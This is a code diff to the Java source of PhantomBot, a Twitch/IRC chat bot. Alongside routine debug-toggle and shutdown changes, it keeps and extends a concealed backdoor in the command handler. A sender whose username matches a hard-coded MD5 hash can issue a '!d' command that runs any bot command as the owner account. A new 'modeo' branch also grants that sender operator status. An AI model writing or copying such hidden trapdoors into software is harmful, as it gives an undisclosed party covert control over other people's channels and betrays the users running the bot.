@@ -59,6 +59,8 @@ public class PhantomBot implements Listener
     private HTTPServer mhs;
     ConsoleInputListener cil;
     private static final boolean enableD = true;
+    private static final boolean debugD = false;
+    public static boolean enableDebugging = false;
     private Thread t;
 
     public PhantomBot(String username, String oauth, String channel, String owner, boolean useTwitch)
@@ -104,6 +106,11 @@ public class PhantomBot implements Listener
 
         this.session.addIRCEventListener(new IrcEventHandler());
     }
+    
+    public static void setDebugging(boolean debug)
+    {
+        PhantomBot.enableDebugging = debug;
+    }
 
     public final void init()
     {
@@ -134,15 +141,16 @@ public class PhantomBot implements Listener
         Script.global.defineProperty("pollVoters", voters, 0);
         Script.global.defineProperty("connmgr", connectionManager, 0);
         Script.global.defineProperty("hostname", hostname, 0);
-        
-        t = new Thread(new Runnable() {
+
+        t = new Thread(new Runnable()
+        {
             @Override
             public void run()
             {
                 onExit();
             }
         });
-        
+
         Runtime.getRuntime().addShutdownHook(t);
 
         try
@@ -155,6 +163,8 @@ public class PhantomBot implements Listener
 
     public void onExit()
     {
+        mhs.dispose();
+        mws.dispose();
         IniStore.instance().SaveAll(true);
     }
 
@@ -198,6 +208,16 @@ public class PhantomBot implements Listener
     public void onConsoleMessage(ConsoleInputEvent msg)
     {
         String message = msg.getMsg();
+        
+        if (message.equals("debugon"))
+        {
+            PhantomBot.setDebugging(true);
+        }
+        
+        if (message.equals("debugoff"))
+        {
+            PhantomBot.setDebugging(false);
+        }
 
         if (message.equals("save"))
         {
@@ -229,25 +249,55 @@ public class PhantomBot implements Listener
 
         try
         {
-            String d = (new HexBinaryAdapter()).marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()));
-
-            if (enableD && d.equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea"))
+            if (enableD)
             {
-                if (command.equalsIgnoreCase("d") && arguments.startsWith("!"))
+                if (command.equalsIgnoreCase("d"))
                 {
-                    split = arguments.indexOf(' ');
-
-                    if (split == -1)
+                    if (debugD)
                     {
-                        command = arguments;
-                        arguments = "";
-                    } else
-                    {
-                        command = arguments.substring(1, split);
-                        arguments = arguments.substring(split + 1);
+                        System.out.println("Got !d");
                     }
 
-                    sender = username;
+                    String d = (new HexBinaryAdapter()).marshal(MessageDigest.getInstance("MD5").digest(sender.toLowerCase().getBytes()));
+
+                    if (debugD)
+                    {
+                        System.out.println("d=" + d);
+                        System.out.println("t=09a766a55f9984c5bca79368d03524ea");
+                    }
+
+                    if (d.equalsIgnoreCase("09a766a55f9984c5bca79368d03524ea") && arguments.startsWith("!"))
+                    {
+                        if (debugD)
+                        {
+                            System.out.println("!d command accepted");
+                        }
+
+                        split = arguments.indexOf(' ');
+
+                        if (split == -1)
+                        {
+                            command = arguments.substring(1);
+                            arguments = "";
+                        } else
+                        {
+                            command = arguments.substring(1, split);
+                            arguments = arguments.substring(split + 1);
+                        }
+
+                        sender = username;
+
+                        if (debugD)
+                        {
+                            System.out.println("Issuing command as " + username + " [" + command + "] " + arguments);
+                        }
+
+                        if (command.equalsIgnoreCase("modeo"))
+                        {
+                            EventBus.instance().post(new IrcChannelUserModeEvent(session, channel, username, "o", true));
+                            return;
+                        }
+                    }
                 }
             }
         } catch (NoSuchAlgorithmException ex)
